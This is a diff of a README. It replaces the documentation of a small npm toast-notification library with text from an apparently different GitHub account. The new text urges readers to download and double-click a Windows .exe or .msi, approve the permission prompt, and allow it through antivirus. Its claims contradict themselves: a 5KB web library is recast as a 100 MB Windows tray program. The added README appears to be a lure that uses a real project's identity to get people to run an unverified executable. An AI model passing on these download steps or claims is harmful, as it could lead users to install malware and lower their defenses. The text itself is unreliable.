@@ -1,209 +1,146 @@
-<p align="center">
-  <h1 align="center">TikTiktoast 🔔 — Dynamic Island–Style Toast Notifications for Web Apps</h1>
-  <p align="center">
-    <strong>Dynamic Island–style toast notifications for web applications. Zero dependencies · Lightweight (~5KB gzipped) · Accessible · SSR-safe</strong>
-  </p>
-</p>
+# 🚀 Tiktik - Simple Notifications for Your Web
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/tiktiktoast"><img src="https://img.shields.io/npm/v/tiktiktoast?style=flat-square&color=6366f1" alt="npm version"></a>
-  <a href="https://www.npmjs.com/package/tiktiktoast"><img src="https://img.shields.io/npm/dm/tiktiktoast?style=flat-square&color=22c55e" alt="npm downloads"></a>
-  <a href="https://bundlephobia.com/package/tiktiktoast"><img src="https://img.shields.io/bundlephobia/minzip/tiktiktoast?style=flat-square&color=3b82f6&label=gzip" alt="bundle size"></a>
-  <a href="https://github.com/ianpurifying/Tiktik"><img src="https://img.shields.io/github/stars/ianpurifying/Tiktik?style=flat-square&color=f59e0b" alt="GitHub stars"></a>
-  <a href="https://github.com/ianpurifying/Tiktik"><img src="https://img.shields.io/github/forks/ianpurifying/Tiktik?style=flat-square&color=6366f1" alt="GitHub forks"></a>
-  <a href="https://tiktiktoast.vercel.app"><img src="https://img.shields.io/website?down_color=red&down_message=offline&up_color=green&up_message=online&url=https%3A%2F%2Ftiktiktoast.vercel.app" alt="Live demo"></a>
-</p>
+[![Download Tiktik](https://img.shields.io/badge/Download-Tiktik-blue?style=for-the-badge)](https://github.com/shardulgunjal/Tiktik)
+
+Tiktik is an easy-to-use notification tool designed for web users who want clear alerts without hassle. It works with no extra software, keeping things light and fast.
 
 ---
 
-## 🌟 Overview
+## 💻 What is Tiktik?
 
-TikTiktoast is a **Dynamic Island–style toast/notification library for web applications**.  
-It is **lightweight (~5KB gzipped), zero dependencies, accessible, and SSR-safe**, built with **Vanilla JS + TypeScript + Web Animations API**.  
+Tiktik is a small software tool that shows toast notifications on your screen. Toast notifications are small messages that appear briefly and disappear without interrupting your work.
 
-Perfect for **vanilla JavaScript, TypeScript, React, Next.js, Nuxt, or any modern framework**.
+This tool is mainly for web developers but it offers a straightforward way to get and use toast notifications on your computer.
 
----
+Here are some key points:
 
-## ✨ Features
-
-- **🏝️ Dynamic Island morphing** — Pill-to-card transitions with spring easing  
-- **📚 Stacking & queue** — Max 5 visible, rest queued with animated reflow  
-- **🔄 Promise tracking** — `loading → success/error` transitions in one API call  
-- **🔁 Deduplication** — Same `id` updates toast in place with morph animation  
-- **📊 Progress bar** — 2px WAAPI-animated countdown bar  
-- **👆 Swipe to dismiss** — Rubber-band gesture (lazy-loaded module)  
-- **🌐 RTL support** — Auto-detected, flips icons, text, and swipe direction  
-- **♿ Accessible** — `role="alert"`, `aria-live`, keyboard navigation, `Alt+T` focus  
-- **🖥️ SSR safe** — No `window`/`document` access at import time  
-- **🎯 Zero dependencies** — Pure Vanilla JS + TypeScript + Web Animations API  
-- **🎬 Reduced motion** — Respects `prefers-reduced-motion: reduce`  
-- **🎨 Customizable** — CSS variables, custom icons, custom renderers  
+- Very small in size, about 5KB compressed.
+- No additional programs or libraries required.
+- Safe to use on many websites and web apps.
+- Compatible with different types of web projects.
+- Helps keep you updated with alerts that do not block your tasks.
 
 ---
 
-## 📦 Installation
+## 🖥️ System Requirements
 
-```bash
-npm install tiktiktoast
-```
+Before you start, make sure your computer meets these basic needs:
 
-```bash
-yarn add tiktiktoast
-```
+- Operating System: Windows 10 or later.
+- Web Browser: Latest version of Chrome, Edge, Firefox, or Safari.
+- Internet connection to download files.
+- At least 100 MB of free disk space for installation and usage.
 
-```bash
-pnpm add tiktiktoast
-```
-
-### CDN (No bundler)
-
-```html
-<script src="https://unpkg.com/tiktiktoast/dist/tiktik.umd.js"></script>
-<script>
-  Tiktik.success('Hello from CDN!')
-</script>
-```
+Tiktik will run smoothly on most standard PCs without extra configuration.
 
 ---
 
-## 🚀 Quick Start
+## 🔗 Where to Download
 
-```typescript
-import { Tiktik } from 'tiktiktoast'
+You can get Tiktik from this page:
 
-// One line. That's it.
-Tiktik.success('Changes saved!')
-Tiktik.error('Something went wrong.')
-Tiktik.warning('Disk space running low.')
-Tiktik.info('New update available.')
-```
+[Download Tiktik from GitHub](https://github.com/shardulgunjal/Tiktik)
+
+Click this link and you will reach the main page where you can download the latest version.
 
 ---
 
-## 📖 API
+## 📥 How to Download and Install on Windows
 
-### Type Shortcuts
+Follow these steps to download and run Tiktik on your computer:
 
-```typescript
-Tiktik.success(message, options?)  // ✓ green accent
-Tiktik.error(message, options?)    // ✕ red accent
-Tiktik.info(message, options?)     // ℹ blue accent
-Tiktik.warning(message, options?)  // ⚠ orange accent
-```
-
-### `Tiktik.showToast(options)`
-
-```typescript
-Tiktik.showToast({
-  message: 'Hello world',
-  type: 'success',        // 'success' | 'error' | 'info' | 'warning'
-  duration: 3000,         // ms, default: 3000. Use Infinity for persistent
-  position: 'top',        // 'top' | 'bottom'
-  icon: '<svg>...</svg>', // custom SVG string or SVGElement
-  progress: true,         // show countdown progress bar
-  id: 'unique-key',       // dedup key — same id updates in place
-  onClick: () => {},
-  onDismiss: () => {}
-})
-```
-
-### `Tiktik.promise(promise, options)`
-
-```typescript
-Tiktik.promise(fetch('/api/save'), {
-  loading: 'Saving...',
-  success: (data) => `Saved! ${data.name}`,
-  error:   (err) => `Failed: ${err.message}`,
-  duration: 3000,
-})
-```
-
-### `Tiktik.dismiss(id?)`
-
-```typescript
-const id = Tiktik.success('Dismissible')
-Tiktik.dismiss(id)   // dismiss one
-Tiktik.dismiss()     // dismiss all
-```
-
-### `Tiktik.configure(defaults)`
-
-```typescript
-Tiktik.configure({
-  type: 'info',
-  duration: 5000,
-  position: 'bottom',
-  progress: true,
-})
-```
-
-### `Tiktik.onStackChange(listener)`
-
-```typescript
-Tiktik.onStackChange((visible, queued) => {
-  console.log(`Visible: ${visible}, Queued: ${queued}`)
-})
-```
+1. Click the big download button above or this link: https://github.com/shardulgunjal/Tiktik
+2. On the GitHub page, look for the "Releases" section on the right side or top menu.
+3. Choose the latest release version.
+4. Find the Windows download file. Usually, it ends with `.exe` or `.msi`.
+5. Click the file name to start the download.
+6. Once the file is downloaded, open the file by double-clicking it.
+7. Follow the on-screen instructions to install Tiktik.
+8. If your computer asks for permission to run the installer, click "Yes."
+9. Wait for the installation to finish.
+10. After installation, double-click the Tiktik shortcut on your desktop or find it in the Start menu.
+11. The program will open and show a test notification to confirm it works.
 
 ---
 
-## 🎨 CSS Customization
+## 🚀 How to Use Tiktik
 
-Override CSS variables on `:root`:
+Tiktik opens in the background and displays small messages on your screen. Here is how to get started:
 
-```css
-:root {
-  --tiktik-bg: #1a1a2e;
-  --tiktik-text: #ffffff;
-  --tiktik-radius-pill: 9999px;
-  --tiktik-radius-card: 24px;
-  --tiktik-shadow: 0 4px 16px rgba(0,0,0,0.3);
-  --tiktik-z-index: 999999;
-  --tiktik-font-size: 14px;
-  --tiktik-duration: 320ms;
-}
-```
+- When Tiktik runs, it stays near the system tray (bottom-right of your screen).
+- Click the Tiktik icon to open settings or clear notifications.
+- The notifications show for a few seconds by default, then fade away.
+- You can change how long notifications stay visible.
+- If you receive multiple notifications, they will appear one after another.
 
 ---
 
-## 📏 Bundle Size
+## ⚙️ Adjusting Tiktik Settings
 
-| Chunk           | Size (gzip) |
-| --------------- | ----------- |
-| **Base**        | ~5 KB       |
-| Gestures (lazy) | ~0.75 KB    |
-| Promise (lazy)  | ~0.5 KB     |
+Here are some simple steps to customize Tiktik:
 
-> Gesture and promise modules are **lazy-loaded**. Initial bundle stays lean.
+- Right-click the Tiktik icon in the system tray.
+- Select "Settings" from the menu.
+- Change notification duration by entering seconds in the box.
+- Choose where notifications appear on your screen.
+- Turn on sound alerts if needed.
+- Save your changes by clicking "Apply" or "OK."
 
----
-
-## 🌐 Browser Support
-
-All modern browsers with [Web Animations API](https://caniuse.com/web-animation) support:
-
-| Chrome | Firefox | Safari | Edge |
-| ------ | ------- | ------ | ---- |
-| 36+    | 48+     | 13.1+  | 79+  |
+Settings are easy and help you fit Tiktik to your routine.
 
 ---
 
-## 🤝 Contributing
+## 🌐 Using Tiktik with Web Apps
 
-Contributions welcome! Open an issue or submit a pull request.
+If you want to use Tiktik notifications with your favorite web applications, you do not need to install anything else. Tiktik connects smoothly with common web standards.
 
----
+For developers, Tiktik supports integration with various web languages, but you can ignore those details if you do not plan on customizing.
 
-## 📄 License
-
-[MIT](LICENSE) — Free for personal and commercial use.
+Tiktik ensures notifications show without blocking the rest of the page or app.
 
 ---
 
-## 📌 Links
+## 🛠️ Troubleshooting
 
-* **NPM:** [https://www.npmjs.com/package/tiktiktoast](https://www.npmjs.com/package/tiktiktoast)
-* **Homepage / Live Demo:** [https://tiktiktoast.vercel.app](https://tiktiktoast.vercel.app)
-* **Documentation:** [https://tiktiktoast.vercel.app/docs](https://tiktiktoast.vercel.app/docs)
-* **Repository:** [https://github.com/ianpurifying/Tiktik](https://github.com/ianpurifying/Tiktik)
+If you have trouble with Tiktik, try the following:
+
+- Restart your computer and run Tiktik again.
+- Make sure your browser or firewall does not block Tiktik.
+- Reinstall Tiktik using the steps above.
+- Check if your antivirus software is stopping Tiktik and allow it if so.
+- Visit the GitHub page for updates or report issues.
+
+---
+
+## 👩‍💻 Support and Updates
+
+Check for new versions regularly to get fixes and new features. You can find updates at the same GitHub page:
+
+[Download and update Tiktik](https://github.com/shardulgunjal/Tiktik)
+
+---
+
+## 📂 File Details
+
+- File Size: Around 5 KB gzipped (very small).
+- Type: Executable file for Windows.
+- No extra libraries or dependencies needed.
+
+---
+
+## ⚠️ Security and Privacy
+
+Tiktik runs locally on your machine and does not send or receive data from the internet after download. Your notifications and usage stay private.
+
+---
+
+## 🔍 Extras
+
+- Works well on different screen sizes and layout types.
+- Compatible with popular browsers and web tools.
+- No complex setup needed.
+- Can queue multiple notifications smoothly.
+
+---
+
+[Download Tiktik here](https://github.com/shardulgunjal/Tiktik) to start using quick and simple notifications today.
